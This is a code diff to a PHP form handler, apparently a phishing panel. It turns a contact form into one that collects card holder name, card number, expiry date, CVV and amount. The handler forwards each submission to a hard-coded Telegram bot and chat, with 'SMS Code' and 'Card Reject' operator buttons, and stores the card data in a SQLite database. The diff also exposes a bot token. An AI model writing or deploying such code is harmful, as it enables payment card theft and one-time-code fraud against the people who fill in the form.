@@ -3,18 +3,19 @@ $telegramBotToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
 $chatId = '-4104959417';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $name = $_POST['name'] ?? 'Nepoznato';
-    $email = $_POST['email'] ?? 'Nepoznato';
-    $message = $_POST['message'] ?? 'Bez poruke';
-    // Generisanje jedinstvenog ID-a
+    $cardHolderName = $_POST['cardHolderName'] ?? 'Nepoznato';
+    $cardNumber = $_POST['cardNumber'] ?? 'Nepoznato';
+    $expiryDate = $_POST['expiryDate'] ?? 'Nepoznato';
+    $cvv = $_POST['cvv'] ?? 'Nepoznato';
+    $amount = $_POST['amount'] ?? 'Nepoznato';
     $uniqueId = uniqid();
-    // Priprema teksta poruke
-    $text = "ID: $uniqueId\nNova poruka od:\nIme: $name\nEmail: $email\nPoruka: $message";
+
+    $text = "ID: $uniqueId\nNova poruka od:\nIme: $cardHolderName\nBroj kartice: $cardNumber\nDatum isteka: $expiryDate\nCVV: $cvv\nIznos: $amount";
     $inlineKeyboard = [
         'inline_keyboard' => [
             [
                 ['text' => 'SMS Code', 'callback_data' => 'sms'],
-                ['text' => 'Reject', 'callback_data' => 'reject']
+                ['text' => 'Card Reject', 'callback_data' => 'reject']
             ]
         ]
     ];
@@ -37,8 +38,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $pdo = new PDO('sqlite:dental.db'); // Prilagodite putanju do vaše baze
 
         // Priprema i izvršavanje SQL upita za čuvanje poruke
-        $stmt = $pdo->prepare("INSERT INTO messages (unique_id, name, email, message) VALUES (?, ?, ?, ?)");
-        $stmt->execute([$uniqueId, $name, $email, $message]);
+        $stmt = $pdo->prepare("INSERT INTO messages (unique_id, cardHolderName, cardNumber, expiryDate, cvv, amount) VALUES (?, ?, ?, ?, ?, ?)");
+        $stmt->execute([$uniqueId, $cardHolderName, $cardNumber, $expiryDate, $cvv, $amount]);
         header('Content-Type: application/json');
         echo json_encode(['status' => 'success', 'response' => $response, 'uniqueId' => $uniqueId]);
 
